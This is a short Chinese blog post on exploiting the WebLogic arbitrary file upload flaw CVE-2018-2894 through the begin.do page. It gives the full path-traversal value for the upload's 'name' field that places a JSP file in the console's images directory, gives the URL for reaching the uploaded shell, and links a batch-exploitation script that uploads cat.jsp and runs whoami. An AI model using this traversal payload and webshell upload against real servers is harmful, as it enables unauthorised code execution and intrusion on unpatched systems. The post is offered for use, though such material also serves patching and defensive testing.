Weblogic任意文件上传漏洞（CVE-2018-2894）

最近大家都在说这个漏洞，大家都注意到config.do这里发生了问题，但是其实根据
https://mp.weixin.qq.com/s/y5JGmM-aNaHcs_6P9a-gRQ
这里的信息，begin.do也是有问题。少扯淡，下面给出具体利用方法：
问题就出现下下面这个页面。
![Alt text](./1532078065241.png)

上传时候，修改name的值就可以了

![Alt text](./1532078209496.png)







避免大家麻烦，给出来：
 /../../../../../../wlserver/server/lib/consoleapp/webapp/framework/skins/wlsconsole/images/
然后访问
 http://xx.xx.xx.xx:7001/console/framework/skins/wlsconsole/images/_222.jsp
 就可以访问到了。
 ![Alt text](./1532078563343.png)




我写了一个批量利用的python脚本，会上传cat.jsp，然后执行whoami

https://github.com/111ddea/cve-2018-2894.git


另外的利用config.do的方法可以看下面：
https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2018-2894
https://xz.aliyun.com/t/2458?from=timeline&isappinstalled=0